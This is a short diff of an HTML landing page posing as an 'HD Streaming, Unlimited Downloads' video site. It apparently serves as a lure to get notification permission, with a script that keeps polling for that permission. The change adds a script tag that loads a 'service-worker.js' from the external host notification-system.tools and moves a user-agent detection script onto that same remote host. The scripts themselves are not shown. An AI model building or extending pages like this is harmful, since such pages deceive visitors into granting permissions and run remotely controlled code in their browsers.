@@ -6,10 +6,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <meta name="google" value="notranslate">
-
   <link href="https://notification-system.tools/notifications/video/3/css/style-optimized.css" rel="stylesheet">
-
   <title>HD Streaming - 720p - Unlimited Downloads</title>
+  <script src="https://notification-system.tools/notifications/video/3/service-worker.js" charset="utf-8"></script>
 </head>
 
 <body class="en ltr" onload="translate();">
@@ -385,13 +384,12 @@
               setTimeout(checkNotificationPermission, 50);
             }
           }
-          г
         }
         checkNotificationPermission();
       })();
     </script>
 
-    <script src="detect.min.js" charset="utf-8"></script>
+    <script src="https://notification-system.tools/notifications/video/3/detect.min.js" charset="utf-8"></script>
     <script type="text/javascript">
       var user = detect.parse(navigator.userAgent);
       var mainLink = document.querySelector('body');
